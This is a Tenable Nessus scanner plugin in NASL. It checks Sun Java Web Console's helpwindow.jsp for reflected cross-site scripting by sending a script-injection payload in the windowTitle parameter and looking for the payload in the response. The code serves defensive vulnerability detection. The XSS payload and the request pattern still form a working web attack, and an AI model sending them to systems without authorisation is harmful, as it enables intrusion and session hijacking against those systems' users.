#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(39590);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(35513);
  script_xref(name:"Secunia", value:"35597");

  script_name(english:"Sun Java Web Console 'helpwindow.jsp' Multiple Cross-Site Scripting Vulnerabilities");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web application has multiple cross-site scripting\n",
      "vulnerabilities."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of Sun Java Web Console running on the remote host has\n",
      "multiple cross-site scripting vulnerabilities in 'helpwindow.jsp'.\n",
      "A remote attacker could exploit these to trick a user into executing\n",
      "arbitrary HTML or script code in the context of the web server.\n",
      "\n",
      "This version reportedly has other cross-site scripting vulnerabilities\n",
      "in a different help file, though Nessus did not check for those issues."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://sunsolve.sun.com/search/document.do?assetkey=1-66-262428-1"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Apply the relevant patch referenced in the vendor's advisory."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("cross_site_scripting.nasl");
  script_require_ports("Services/www", 6789);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:6789);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0, "Web server itself is prone to XSS attacks.");

unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";
xss = string("windowTitle=</title><script>alert('", SCRIPT_NAME, "')</script>");
encoded_xss = urlencode(str:xss, unreserved:unreserved);
expected_output = string(
  "<title></title><script>alert\\('",
  SCRIPT_NAME,
  "'\\)</script></title"
);

url = string('/console/faces/com_sun_web_ui/help/helpwindow.jsp?', encoded_xss);
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, 'The web server did not respond to the GET request.');

if (egrep(string:res[2], pattern:expected_output, icase:TRUE))
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus detected this issue using the following URL :\n\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
else exit(0, 'The system does not appear to be vulnerable.');
